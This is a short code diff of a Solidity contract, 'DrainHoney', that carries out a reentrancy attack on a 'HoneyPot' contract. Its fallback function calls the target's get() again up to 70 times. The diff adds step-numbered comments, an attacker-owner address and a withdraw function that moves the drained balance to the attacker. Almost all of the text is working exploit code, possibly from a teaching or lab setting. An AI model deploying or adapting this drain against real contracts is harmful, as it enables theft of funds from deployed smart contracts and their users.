@@ -9,21 +9,29 @@ contract DrainHoney {
 
   HoneyPot hp;
   uint loop;
+  address hacker;
 
   function DrainHoney(address _contract) {
     hp = HoneyPot(_contract);
+    hacker = msg.sender;
   }
-  // send 0.1 first
-  function sendMoney() {
-    hp.put.call.value(msg.value)();
+  // step 1: send 0.1 first
+  function sendMoney() payable {
+    hp.put.value(msg.value)();
   }
-  // call get next
+  // step 2: call get next
   function get() {
     hp.get();
   }
 
+  // step 3: just withdraw everything
+  function withdraw() {
+    require(msg.sender == hacker);
+    msg.sender.transfer(this.balance);
+  }
+
   function() payable {
-     if (loop < 50) {
+     if (loop < 70) {
        loop++;
        hp.get();
      }
